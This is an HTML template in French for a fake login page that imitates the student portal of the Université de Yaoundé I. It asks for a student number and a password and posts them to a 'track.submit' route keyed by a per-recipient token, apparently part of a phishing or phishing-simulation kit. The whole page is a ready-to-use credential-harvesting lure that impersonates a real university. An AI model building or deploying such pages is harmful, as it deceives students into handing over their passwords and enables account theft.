<!doctype html>
<html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Portail Etudiant - Universite</title>
<style>
  body { margin:0; font-family: 'Times New Roman', serif; background:#eef2f7; }
  .header { background:#003D7A; color:#fff; padding:22px; text-align:center;}
  .header h1 { margin:0; font-size:1.2rem; letter-spacing:.05em;}
  .box { max-width:400px; margin:36px auto; background:#fff; padding:30px; border:1px solid #ccc;}
  h2 { color:#003D7A; margin-top:0;}
  input { width:100%; padding:10px; margin:8px 0; box-sizing:border-box; border:1px solid #aaa; font-family:Arial;}
  button { width:100%; padding:11px; background:#003D7A; color:#fff; border:0; font-weight:bold; cursor:pointer;}
  .footer { margin-top:16px; font-size:.72rem; color:#666; text-align:center; font-family:Arial;}
</style></head><body>
<div class="header"><h1>UNIVERSITE DE YAOUNDE I — PORTAIL ETUDIANT</h1></div>
<div class="box">
  <h2>Connexion</h2>
  <p style="color:#333; font-family:Arial; font-size:.92rem;">Veuillez vous identifier pour acceder a votre dossier.</p>
  <form method="post" action="{{ url_for('track.submit', token=token) }}">
    <input type="text" name="identifier" placeholder="Matricule (ex: 22A001)" required>
    <input type="password" name="secret" placeholder="Mot de passe" required>
    <button type="submit">SE CONNECTER</button>
  </form>
  <div class="footer">Rectorat — Universite de Yaoundé I, Cameroun</div>
</div>
</body></html>
